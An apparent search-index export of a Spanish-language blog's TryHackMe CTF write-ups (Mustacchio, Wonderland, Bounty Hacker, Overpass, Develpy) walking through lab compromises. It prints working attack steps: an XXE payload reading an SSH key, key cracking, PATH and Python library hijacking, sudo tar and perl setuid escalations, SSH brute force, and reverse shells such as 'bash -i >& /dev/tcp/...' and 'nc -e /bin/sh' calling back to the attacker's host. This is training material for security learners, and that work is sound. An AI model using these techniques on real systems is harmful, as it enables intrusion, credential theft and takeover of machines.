\u0026#34;php://filter/convert.base64-encode/resource=/home/barry/.ssh/id_rsa\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;comment\u0026gt; \u0026lt;name\u0026gt;\u0026amp;testxxe;\u0026lt;/name\u0026gt; \u0026lt;author\u0026gt;test2\u0026lt;/author\u0026gt; \u0026lt;com\u0026gt;test3\u0026lt;/com\u0026gt; \u0026lt;/comment\u0026gt; La respuesta está encriptada con base64. La podemos desencriptar de la siguiente forma\necho \u0026#34;Respuesta en base64\u0026#34; | base64 -d La respuesta la guardamos en un archivo llamado id_rsa y le hacemos un chmod 400 id_rsa.\nLa \u0026ldquo;RSA PRIVATE KEY\u0026rdquo; está encriptada, la podemos desencriptar con john:\nssh2john id_rsa \u0026gt; hash.txt john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt Ya tenemos unas credenciales para conectarnos por ssh\nEscalada de privilegios Dentro de /home/joe hay un archivo interesante\nbarry@mustacchio:/home/joe# file live_log live_log: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6c03a68094c63347aeb02281a45518964ad12abe, for GNU/Linux 3.2.0, not stripped Con el comando strings podemos ver cadenas de texto, En una línea se ve como ejecuta tail sin poner la ruta completa, nos podemos aprovechar de esto creando un tail en /tmp y añadiendo el /tmp en el path, de esta forma podremos ejecutar lo que queramos como root.\necho \u0026#34;/bin/bash\u0026#34; \u0026gt; /tmp/tail chmod +x /tmp/tail export PATH=/tmp:$PATH ¡Ya somos root!\n","date":"2023-01-18","id":112,"permalink":"/writeups/tryhackme/mustacchio/","summary":"https://tryhackme.com/room/mustacchio\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.3.160\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Mediana","Linux","xxe"],"title":"Mustacchio"},{"content":"","date":"2023-01-18","id":113,"permalink":"/tags/xxe/","summary":"","tags":[],"title":"xxe"},{"content":"","date":"2023-01-11","id":114,"permalink":"/tags/bash/","summary":"","tags":[],"title":"bash"},{"content":"","date":"2023-01-11","id":115,"permalink":"/tags/perl/","summary":"","tags":[],"title":"perl"},{"content":"https://tryhackme.com/room/wonderland\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.3.160\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.10.186.98 PING 10.10.186.98 (10.10.186.98) 56(84) bytes of data. 64 bytes from 10.10.186.98: icmp_seq=1 ttl=63 time=45.4 ms --- 10.10.186.98 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 45.355/45.355/45.355/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.126.65 -oG allPorts Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬───────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼───────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.186.98 5 │ [*] Open ports: 22,80 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴───────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n❯ nmap -p22,80 -sC -sV 10.10.186.98 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8eeefb96cead70dd05a93b0db071b863 (RSA) | 256 7a927944164f204350a9a847e2c2be84 (ECDSA) |_ 256 000b8044e63d4b6947922c55147e2ac9 (ED25519) 80/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Follow the white rabbit. Web (Puerto 80) Reconocimiento web Al entrar a la web lo primero que vemos es lo siguiente\nCon ctrl + u podemos ver el codigo de la web. Vemos que saca la foto de un subdirectorio llamado img\n\u0026lt;img src=\u0026#34;/img/white_rabbit_1.jpg\u0026#34; style=\u0026#34;height: 50rem;\u0026#34;\u0026gt; Al entrar al directorio /img vemos que hay 2 fotos más\nalice_door.jpg alice_door.png white_rabbit_1.jpg Buscando archivos ocultos en las fotos Nos las pasamos a nuestra máquina con wget:\nwget http://10.10.186.98/img/alice_door.jpg wget http://10.10.186.98/img/alice_door.png wget http://10.10.186.98/img/white_rabbit_1.jpg Con la herramienta steghide podemos comprobar si contienen archivos ocultos\nsteghide extract -sf white_rabbit_1.jpg Solo la foto white_rabbit_1.jpg contiene un archivo oculto, el cual dice lo siguiente\nfollow the r a b b i t\nBuscando subdirectorios Con wfuzz vamos a buscar subdirectorios en la web\nwfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.186.98/FUZZ Encuentra los siguientes subdirectorios:\nr img poem Al entrar en el /r vemos lo siguiente:\nVamos a volver a usar el wfuzz sobre el directorio /r\nwfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.186.98/r/FUZZ Nos encuentra un subdirectorio llamado a. Recordando la pista que había en la primera foto \u0026ldquo;follow the r a b b i t\u0026rdquo; podemos intuir que habrá un subdirectorio por cada letra de la palabra \u0026ldquo;rabbit\u0026rdquo;.\nDentro de http://10.10.186.98/r/a/b/b/i/t vemos lo siguiente\nPulsando ctrl + u para ver el código de la web podemos ver una línea que dice un usuario y una contraseña\n\u0026lt;p style=\u0026#34;display: none;\u0026#34;\u0026gt;alice:--password-censurada--\u0026lt;/p\u0026gt; ssh (puerto 22) Ya nos podemos conectar por ssh con las credenciales anteriores\u0026hellip;\nssh alice@10.10.186.98 Escalada de privilegios Escalada a rabbit Dentro de la carpeta /home/alice/ vemos tres archivos\n-rw\u0026mdash;\u0026mdash;- root.txt -rw-r\u0026ndash;r\u0026ndash; walrus_and_the_carpenter.py Con sudo -l vemos que podemos ejecutar /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py como el usuario rabbit.\nViendo el código del archivo walrus_and_the_carpenter.py vemos que importa la librería random para después usar la función choice.\nLo que podemos hacer es, en la misma carpeta crear un archivo llamado random.py, para que sea este archivo el que importe y no el de /usr/lib/python3.6/random.py y asi poder ejecutar código como rabbit.\nContenido del random.py:\nimport os def choice(a): os.system(\u0026#34;whoami\u0026#34;) Al ejecutar el walrus_and_the_carpenter.py sale lo siguiente:\nalice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py rabbit The line was:\tNone Ahora si cambiamos el código del random.py a lo siguiente y volvemos a ejecutar el walrus_and_the_carpenter.py ya somos rabbit\nimport os def choice(a): os.system(\u0026#34;bash\u0026#34;) Escalada a hatter En /home/rabbit/ hay un archivo llamado teaParty que es un binario con permisos suid\n-rwsr-sr-x 1 root root 16816 May 25 2020 teaParty\nAl ejecutarlo vemos lo siguiente:\nrabbit@wonderland:/home/rabbit$ ./teaParty Welcome to the tea party! The Mad Hatter will be here soon. Probably by Thu, 12 Jan 2023 15:48:13 +0000 Ask very nicely, and I will give you some tea while you wait for him Con el comando strings podemos ver cadenas de texto legible. Podemos ver que usa el comando date se ejecuta con la ruta relativa. Ejemplo (/bin/echo: Ruta absoluta / echo: Ruta relativa).\nNos podemos aprovechar de esto ejecutando lo siguiente:\nexport PATH=/tmp:$PATH La variable PATH es utilizada para especificar una lista de directorios separados por un delimitador (generalmente un dos puntos \u0026ldquo;:\u0026rdquo;) en los que el sistema operativo buscará ejecutables. En este caso, se agrega el directorio \u0026ldquo;/tmp\u0026rdquo; al inicio de la lista existente de directorios en PATH. Esto significa que el sistema operativo buscará primero en el directorio \u0026ldquo;/tmp\u0026rdquo; cuando se busque un ejecutable.\nAhora dentro de /tmp podemos crear un archivo llamado date con el siguiente código:\n#!/bin/bash bash Ya podemos ejecutar el teaParty y somos hatter\nEscalada a root En /home/hatter hay un archivo con su contraseña.\nEl comando \u0026ldquo;getcap\u0026rdquo; muestra los permisos de ejecución de los programas en el sistema de archivos raíz (\u0026quot;/\u0026quot;)\nhatter@wonderland:/home/rabbit$ getcap -r / 2\u0026gt;/dev/null /usr/bin/perl5.26.1 = cap_setuid+ep /usr/bin/mtr-packet = cap_net_raw+ep /usr/bin/perl = cap_setuid+ep Si el binario tiene la capacidad CAP_SETUID de Linux establecida o es ejecutado por otro binario con la capacidad establecida, se puede usar como una puerta trasera para mantener el acceso privilegiado mediante la manipulación de su propio UID de proceso.\n/usr/bin/perl -e \u0026#39;use POSIX qw(setuid); POSIX::setuid(0); exec \u0026#34;/bin/sh\u0026#34;;\u0026#39; Ya somos root\n","date":"2023-01-11","id":116,"permalink":"/writeups/tryhackme/wonderland/","summary":"https://tryhackme.com/room/wonderland\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.3.160\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Mediana","Linux","python","bash","perl"],"title":"Wonderland"},{"content":"https://tryhackme.com/room/cowboyhacker\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.131.60\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.10.131.60 PING 10.10.131.60 (10.10.131.60) 56(84) bytes of data. 64 bytes from 10.10.131.60: icmp_seq=1 ttl=63 time=57.5 ms --- 10.10.131.60 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 57.483/57.483/57.483/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.131.60 -oG allPorts Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬───────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼───────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.131.60 5 │ [*] Open ports: 21,22,80 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴───────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n❯ nmap -p21,22,80 -sC -sV 10.10.131.60 PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can\u0026#39;t get directory listing: TIMEOUT | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.18.80.135 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 2 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 dcf8dfa7a6006d18b0702ba5aaa6143e (RSA) | 256 ecc0f2d91e6f487d389ae3bb08c40cc9 (ECDSA) |_ 256 a41a15a5d4b1cf8f16503a7dd0d813c2 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel FTP El nmap reporto que podemos acceder al ftp como anonymous.\nAl entrar vemos dos archivos los cuales nos podemos pasar con get a nuestra máquina\nEn el archivo locks.txt vemos que hay una lista de a lo mejor posibles contraseñas y en el task.txt vemos lo siguiente\n1.) Protect Vicious.\n2.) Plan for Red Eye pickup on the moon.\n-lin\n1.) Proteger a Vicious.\n2.) Plan para recoger a Red Eye en la luna.\n-lin\nYa tenemos un usuario (lin)\nSSH Con hydra vamos a intentar hacer fuerza bruta al usuario lin con las posibles contraseñas del logs.txt que nos hemos pasado anteriormente a nuestra máquina\nhydra -l lin -P locks.txt 10.10.131.60 ssh -t 40 Ya tenemos la contraseña\nEscalada de privilegios Con sudo -l y proporcionando la contraseña que hemos encontrado anteriormente vemos que el usuario lin puede ejecutar tar como root.\nsudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh Ya somos root\n","date":"2023-01-08","id":117,"permalink":"/writeups/tryhackme/bounty-hacker/","summary":"https://tryhackme.com/room/cowboyhacker\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.131.60\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Fácil","Linux","tar"],"title":"Bounty Hacker"},{"content":"","date":"2023-01-08","id":118,"permalink":"/tags/tar/","summary":"","tags":[],"title":"tar"},{"content":"","date":"2023-01-07","id":119,"permalink":"/tags/crontab/","summary":"","tags":[],"title":"crontab"},{"content":"https://tryhackme.com/room/overpass\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.170.40\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.10.170.40 PING 10.10.170.40 (10.10.170.40) 56(84) bytes of data. 64 bytes from 10.10.170.40: icmp_seq=1 ttl=63 time=218 ms --- 10.10.170.40 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 217.508/217.508/217.508/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.170.40 -oG allPorts Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬───────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼───────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.170.40 5 │ [*] Open ports: 22,80 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴───────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n❯ nmap -p 22,80 -sC -sV 10.10.170.40 Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-07 20:15 CET Nmap scan report for 10.10.170.40 Host is up (0.052s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 37968598d1009c1463d9b03475b1f957 (RSA) | 256 5375fac065daddb1e8dd40b8f6823924 (ECDSA) |_ 256 1c4ada1f36546da6c61700272e67759c (ED25519) 80/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Overpass Web Con el whatweb podemos ver más información sobre la web:\n❯ whatweb 10.10.170.40 http://10.10.170.40 [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.10.170.40], Script, Title[Overpass], X-UA-Compatible[IE=edge] Al entrar a la web con lo primero que nos encontramos es esta página\nBuscando Subdirectorios Con wfuzz vamos a buscar subdirectorios mediante el diccionario /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\nwfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000069: 301 0 L 0 W 0 Ch \u0026#34;downloads\u0026#34; 000000039: 301 0 L 0 W 0 Ch \u0026#34;img\u0026#34; 000000156: 301 0 L 0 W 0 Ch \u0026#34;aboutus\u0026#34; 000000259: 301 2 L 3 W 42 Ch \u0026#34;admin\u0026#34; 000000550: 301 0 L 0 W 0 Ch \u0026#34;css\u0026#34; Infiltración Dentro del /admin hay un panel de login. Viendo el codigó del /admin se puede ver que hay un login.js\n\u0026lt;script src=\u0026#34;/login.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; El cual contiene lo siguiente:\nasync function postData(url = \u0026#39;\u0026#39;, data = {}) { // Default options are marked with * const response = await fetch(url, { method: \u0026#39;POST\u0026#39;, // *GET, POST, PUT, DELETE, etc. cache: \u0026#39;no-cache\u0026#39;, // *default, no-cache, reload, force-cache, only-if-cached credentials: \u0026#39;same-origin\u0026#39;, // include, *same-origin, omit headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39; }, redirect: \u0026#39;follow\u0026#39;, // manual, *follow, error referrerPolicy: \u0026#39;no-referrer\u0026#39;, // no-referrer, *client body: encodeFormData(data) // body data type must match \u0026#34;Content-Type\u0026#34; header }); return response; // We don\u0026#39;t always want JSON back } const encodeFormData = (data) =\u0026gt; { return Object.keys(data) .map(key =\u0026gt; encodeURIComponent(key) + \u0026#39;=\u0026#39; + encodeURIComponent(data[key])) .join(\u0026#39;\u0026amp;\u0026#39;); } function onLoad() { document.querySelector(\u0026#34;#loginForm\u0026#34;).addEventListener(\u0026#34;submit\u0026#34;, function (event) { //on pressing enter event.preventDefault() login() }); } async function login() { const usernameBox = document.querySelector(\u0026#34;#username\u0026#34;); const passwordBox = document.querySelector(\u0026#34;#password\u0026#34;); const loginStatus = document.querySelector(\u0026#34;#loginStatus\u0026#34;); loginStatus.textContent = \u0026#34;\u0026#34; const creds = { username: usernameBox.value, password: passwordBox.value } const response = await postData(\u0026#34;/api/login\u0026#34;, creds) const statusOrCookie = await response.text() if (statusOrCookie === \u0026#34;Incorrect credentials\u0026#34;) { loginStatus.textContent = \u0026#34;Incorrect Credentials\u0026#34; passwordBox.value=\u0026#34;\u0026#34; } else { Cookies.set(\u0026#34;SessionToken\u0026#34;,statusOrCookie) window.location = \u0026#34;/admin\u0026#34; } } Lo que hace es: Se verifica la respuesta del servidor para comprobar si contiene la cadena \u0026ldquo;Incorrect credentials\u0026rdquo; (credenciales incorrectas), y si no se recibe, el script establece una cookie llamada \u0026ldquo;SessionToken\u0026rdquo; con el valor de la respuesta del servidor y redirige al usuario a la página \u0026ldquo;/admin\u0026rdquo;.\nEntonces lo que podemos hacer es crear una cookie con el nombre \u0026ldquo;SessionToken\u0026rdquo; y el value random. Al recargar ya podemos entrar\nLo que vemos al recargar la página, es una RSA private key.\nEsa private key la vamos a guardar en un archivo llamado id_rsa\nPrimero le damos los permisos:\nchmod 600 id_rsa En la rsa private key vemos que pone que està encriptada.\nPara conesguir la contraseña vamos a sacar el hash con ssh2john y después con john mediante un diccionario vamos a probar de crackearlo\nssh2john id_rsa \u0026gt; hash.txt john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash Ya tenemos la contraseña\nAhora nos conectamos por ssh como james con la id_rsa\nssh -i id_rsa james@10.10.45.54 Escalada de privilegios Con un cat /etc/crontab\nVemos que hace como root un curl a overpass.thm/downloads/src/buildscript.sh y después lo ejecuta con bash.\nTenemos permisos para editar el /etc/hosts\nAñadimos lo siguiente en el /etc/hosts\n10.10.10.10 overpass.thm Después desde nuestra máquina creamos las carpetas y el archivo que salen en la url del crontab\n❯ cat downloads/src/buildscript.sh ───────┬───────────────────────────────────────────────────────────────────────────────────────── │ File: downloads/src/buildscript.sh ───────┼───────────────────────────────────────────────────────────────────────────────────────── 1 │ #!/bin/bash 2 │ 3 │ bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/443 0\u0026gt;\u0026amp;1\u0026#34; ───────┴───────────────────────────────────────────────────────────────────────────────────────── Nos abrimos un servidor con python\nsudo python3 -m http.server 80 Y por último nos ponemos en escucha por el puerto 443 con netcat\nnc -nlvp 443 Nos esperamos un rato y ya somos root\n","date":"2023-01-07","id":120,"permalink":"/writeups/tryhackme/overpass/","summary":"https://tryhackme.com/room/overpass\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.170.40\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Fácil","Linux","crontab"],"title":"Overpass"},{"content":"Link de la máquina\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.139.165\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.10.139.165 PING 10.10.139.165 (10.10.139.165) 56(84) bytes of data. 64 bytes from 10.10.139.165: icmp_seq=1 ttl=63 time=50.4 ms --- 10.10.139.165 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 50.434/50.434/50.434/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.139.165 -oG allPorts Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬───────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼───────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.139.165 5 │ [*] Open ports: 22,10000 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴───────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n❯ nmap -p22,10000 -sC -sV 10.10.139.165 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 78c44084f442138e79f86be46dbfd446 (RSA) | 256 259df329a2624b24f28336cfa775bb66 (ECDSA) |_ 256 e7a007b0b9cb74e9d6167d7a67fec11d (ED25519) 10000/tcp open snet-sensor-mgmt? | fingerprint-strings: | GenericLines: | Private 0days | Please enther number of exploits to send??: Traceback (most recent call last): | File \u0026#34;./exploit.py\u0026#34;, line 6, in \u0026lt;module\u0026gt; | num_exploits = int(input(\u0026#39; Please enther number of exploits to send??: \u0026#39;)) | File \u0026#34;\u0026lt;string\u0026gt;\u0026#34;, line 0 | SyntaxError: unexpected EOF while parsing | GetRequest: | Private 0days | Please enther number of exploits to send??: Traceback (most recent call last): | File \u0026#34;./exploit.py\u0026#34;, line 6, in \u0026lt;module\u0026gt; | num_exploits = int(input(\u0026#39; Please enther number of exploits to send??: \u0026#39;)) | File \u0026#34;\u0026lt;string\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; | NameError: name \u0026#39;GET\u0026#39; is not defined | HTTPOptions, RTSPRequest: | Private 0days | Please enther number of exploits to send??: Traceback (most recent call last): | File \u0026#34;./exploit.py\u0026#34;, line 6, in \u0026lt;module\u0026gt; | num_exploits = int(input(\u0026#39; Please enther number of exploits to send??: \u0026#39;)) | File \u0026#34;\u0026lt;string\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; | NameError: name \u0026#39;OPTIONS\u0026#39; is not defined | NULL: | Private 0days |_ Please enther number of exploits to send??: Puerto 10000 Cuando nos conectamos por nc al puerto 10000 sale este mensaje:\n❯ nc 10.10.139.165 10000 Private 0days Please enther number of exploits to send??: Si ponemos una letra en vez de un número da error. En este error podemos ver que el programa está hecho en python y que se llama exploit.py. Es posible que sea posible inyectar código en un programa que espera una entrada del usuario y luego la interpreta como una variable.\nSi probamos ejecutando esto: __import__('os').system('whoami') nos devuelve el usuario king\n❯ nc 10.10.139.165 10000 Private 0days Please enther number of exploits to send??: __import__(\u0026#39;os\u0026#39;).system(\u0026#39;whoami\u0026#39;) king Exploit started, attacking target (tryhackme.com)... Intrusión Como ya hemos visto que podemos inyectar código vamos a intentar mandarnos una reverse shell.\nPrimero nos ponemos en escucha por el puerto 443 con netcat de la siguiente forma: nc -nvlp 443 Después en el exploit.py le vamos a poner __import__('os').system('nc -e /bin/sh 10.10.10.10 443')\nEscalada de privilegios Tratamiento de la tty Antes de empezar lo primero para trabajar mejor es hacer un tratamiento de la tty\u0026hellip;\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export SHELL=bash export TERM=xterm user.txt La falg user.txt está en /home/king/user.txt y la podemos ver con un cat /home/king/user.txt\nroot.txt Con un cat /etc/crontab podemos ver que el archivo root.sh lo está ejecutando continuamente el usuario root. No tenemos permisos de escritura en el root.sh, pero lo que podemos hacer es borrarlo, crear un archivo que se llame igual y dentro ponerle el siguiente código\n#!/bin/bash nc -e /bin/sh 10.10.10.10 442 Y nos ponemos en escucha con netcat por el puerto 442\nAl cabo de unos segundos recibimos la conexión y somos root. Podemos ver la flag con un cat /root/root.txt\n","date":"2022-12-31","id":121,"permalink":"/writeups/tryhackme/develpy/","summary":"Link de la máquina\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.139.165\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Fácil","Linux","python","crontab"],"title":"Develpy"},{"content":"","date":"2022-12-30","id":122,"permalink":"/tags/cve-2020-1938/","summary":"","tags":[],"title":"CVE-2020-1938"},{"content":"Link de la máquina\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.126.65\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.10.126.65 PING 10.10.126.65 (10.10.126.65) 56(84) bytes of data. 64 bytes from 10.10.126.65: icmp_seq=1 ttl=63 time=53.0 ms --- 10.10.126.65 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 52.964/52.964/52.964/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.126.65 -oG allPorts Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬───────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼───────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.126.65 5 │ [*] Open ports: 22,53,8009,8080 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴───────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n❯ nmap -p22,53,8009,8080 -sC -sV 10.10.126.65 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 f3c89f0b6ac5fe95540be9e3ba93db7c (RSA) | 256 dd1a09f59963a3430d2d90d8e3e11fb9 (ECDSA) |_ 256 48d1301b386cc653ea3081805d0cf105 (ED25519) 53/tcp open tcpwrapped 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) | ajp-methods: |_ Supported methods: GET HEAD POST OPTIONS 8080/tcp open http Apache Tomcat 9.0.30 |_http-favicon: Apache Tomcat |_http-title: Apache Tomcat/9.0.30 Puerto 8009 Con searchsploit podemos buscar si existe algún exploit para ajp\n❯ searchsploit ajp -------------------------------------------------------- --------------------------------- Exploit Title | Path -------------------------------------------------------- --------------------------------- Apache Tomcat - AJP \u0026#39;Ghostcat File Read/Inclusion | multiple/webapps/48143.py Apache Tomcat - AJP \u0026#39;Ghostcat\u0026#39; File Read/Inclusion (Met | 